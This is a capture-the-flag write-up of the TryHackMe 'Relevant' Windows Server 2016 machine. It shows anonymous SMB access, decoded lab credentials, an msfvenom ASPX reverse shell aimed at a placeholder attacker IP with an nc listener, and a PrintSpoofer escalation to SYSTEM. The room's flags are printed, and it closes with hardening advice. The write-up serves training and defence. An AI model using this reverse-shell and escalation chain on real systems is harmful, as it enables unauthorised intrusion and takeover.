# Relevant — TryHackMe Write-Up

**Author:** XENOS  
**Date:** 2026-03-22  
**Platform:** TryHackMe  
**Difficulty:** Medium  
**OS:** Windows Server 2016  

---

## Summary

A Windows Server 2016 machine exposing SMB and IIS. An anonymous-accessible SMB share contained Base64-encoded credentials and was directly mapped to the IIS web root on a non-standard port. This allowed uploading a malicious `.aspx` reverse shell, gaining code execution as `iis apppool\defaultapppool`. The service account held `SeImpersonatePrivilege`, which was leveraged via PrintSpoofer to escalate to `NT AUTHORITY\SYSTEM`.

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sCV -O -Pn -o nmap-result.nmap 10.114.170.134
```

**Results:**

| Port | State | Service | Version |
|------|-------|---------|---------|
| 80/tcp | open | http | Microsoft IIS httpd 10.0 |
| 135/tcp | open | msrpc | Microsoft Windows RPC |
| 139/tcp | open | netbios-ssn | Microsoft Windows netbios-ssn |
| 445/tcp | open | microsoft-ds | Windows Server 2016 Standard 14393 |
| 3389/tcp | open | ms-wbt-server | Microsoft Terminal Services |

Key observations:
- **SMB (445)** is open — potential for anonymous access or credential-based enumeration.
- **IIS 10.0 on port 80** — Windows web server, executes `.aspx` files natively.
- **RDP (3389)** — useful if valid credentials are found.
- **OS:** Windows Server 2016 Build 14393 — confirmed via RDP certificate and SMB banner.

---

## Enumeration

### SMB Share Enumeration

```bash
smbclient -L //10.114.170.134 -N
```

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
nt4wrksv        Disk
```

`nt4wrksv` is a non-default share — worth investigating.

### Accessing the Share Anonymously

```bash
smbclient //10.114.170.134/nt4wrksv -N -c "lcd /tmp; get passwords.txt"
cat /tmp/passwords.txt
```

```
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```

The file is world-readable with no authentication required.

### Decoding Credentials

```bash
echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d
echo "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk" | base64 -d
```

```
Bob  - !P@$$W0rD!123
Bill - Juw4nnaM4n420696969!$$$
```

### Discovering the Web Root Mapping

Navigating to `http://10.114.170.134/nt4wrksv/passwords.txt` returned nothing — port 80 did not serve the share. However, the non-standard port 49663 revealed the connection:

```
http://10.114.170.134:49663/nt4wrksv/passwords.txt
```

This returned the file contents, confirming that the `nt4wrksv` SMB share is mapped directly to the IIS web root on port 49663. Any file uploaded to the share is immediately accessible — and executable — via the web server.

---

## Exploitation — ASPX Reverse Shell via SMB Upload

### Generating the Payload

Since the web server is IIS on Windows, the shell must be in `.aspx` format (the Windows equivalent of PHP for Apache):

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f aspx > shell.aspx
```

### Uploading via SMB

```bash
smbclient //10.114.170.134/nt4wrksv -U Bob -c "put shell.aspx"
# Password: !P@$$W0rD!123
```

### Catching the Shell

```bash
nc -lvnp 4444
```

Then triggered the shell by navigating to:

```
http://10.114.170.134:49663/nt4wrksv/shell.aspx
```

Shell received as `iis apppool\defaultapppool`.

---

## User Flag

```
cd C:\Users\Bob\Desktop
type user.txt
```

```
THM{fdk4ka34vk346ksxfr21tg789ktf45}
```

---

## Privilege Escalation — SeImpersonatePrivilege via PrintSpoofer

### Enumerating Privileges

```
whoami /priv
```

```
Privilege Name                Description                               State
============================= ========================================= ========
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
```

`SeImpersonatePrivilege` is enabled — a well-known escalation path on IIS service accounts.

### Understanding the Privilege

`SeImpersonatePrivilege` allows a process to impersonate the security context of another user. IIS worker processes hold this by design to handle client requests. An attacker can abuse it by creating a named pipe, tricking a privileged process (like the Print Spooler service running as SYSTEM) into connecting to it, then stealing the SYSTEM token via `CreateProcessAsUser()` to launch a new process as SYSTEM.

### PrintSpoofer

PrintSpoofer automates this attack chain:

1. Creates a named pipe controlled by the attacker.
2. Tricks the Windows Print Spooler into connecting as SYSTEM.
3. Captures the SYSTEM token and spawns a new process (`cmd`) under that identity.

### Uploading PrintSpoofer

```bash
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
smbclient //10.114.170.134/nt4wrksv -U Bob -c "lcd /tmp; put PrintSpoofer64.exe"
```

### Executing

```
C:\inetpub\wwwroot\nt4wrksv\PrintSpoofer64.exe -i -c cmd
```

```
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
```

SYSTEM shell obtained.

---

## Root Flag

```
cd C:\Users\Administrator\Desktop
type root.txt
```

```
THM{1fk5kf469devly1gl320zafgl345pv}
```

---

## Attack Chain

```
nmap → SMB + IIS on Windows Server 2016
  ↓
Anonymous SMB → passwords.txt → Bob:!P@$$W0rD!123
  ↓
SMB share = IIS web root on port 49663
  ↓
Upload shell.aspx → RCE as iis apppool\defaultapppool
  ↓
SeImpersonatePrivilege → PrintSpoofer → NT AUTHORITY\SYSTEM
```

---

## Key Takeaways

**SMB misconfiguration:** Exposing a writable SMB share that maps directly to a web root is a critical configuration error. Any file placed in the share becomes instantly executable through the web server — effectively turning file-sharing access into remote code execution.

**Credential storage:** Storing credentials in a world-readable file, even encoded in Base64, provides no real protection. Base64 is an encoding scheme, not encryption — it is reversed in seconds.

**SeImpersonatePrivilege:** IIS service accounts hold this privilege by design. On unpatched or misconfigured Windows systems, it reliably leads to SYSTEM via token impersonation attacks. Hardening measures include restricting service account privileges and applying KB5005413.

**Port enumeration matters:** The critical attack vector — the IIS web root on port 49663 — would have been missed without a thorough port scan. Always scan the full port range when time permits.

---

*— XENOS*
